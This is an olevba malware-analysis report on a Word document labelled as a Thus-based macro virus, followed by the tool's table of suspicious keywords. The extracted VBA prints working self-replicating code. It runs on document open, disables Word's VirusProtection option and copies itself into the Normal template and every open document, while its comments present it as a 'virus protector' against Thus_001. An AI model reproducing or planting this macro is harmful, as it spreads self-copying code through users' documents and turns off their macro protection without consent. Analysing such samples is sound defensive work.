olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-15d478944c204a9c8caff3f5ff58da7e14c17c1c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-15d478944c204a9c8caff3f5ff58da7e14c17c1c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error Resume Next
Dim k
'-- A macro called Thus_001 propegates to all open word documents and is
'-- set to delete all files on a users c: drive on December 13th.

'-- This macro is designed to search your word documents and remove the Thus_001 macro.
    Application.Options.VirusProtection = False
    '-- Remove Thus_001 from all open components
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) = "'Thus_001'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
            .deletelines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
            .CodeModule.CountOfLines
    End If
    '-- Insert Virus Protector into open components
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
            .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
            .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
            .Item(1).CodeModule.CountOfLines)
    End If

    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    '-- Remove Thus_001 from all open documents
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) = "'Thus_001'" Then
        Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.deletelines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    '-- Insert virus Protector into open documents
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    Next k
End Sub





























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

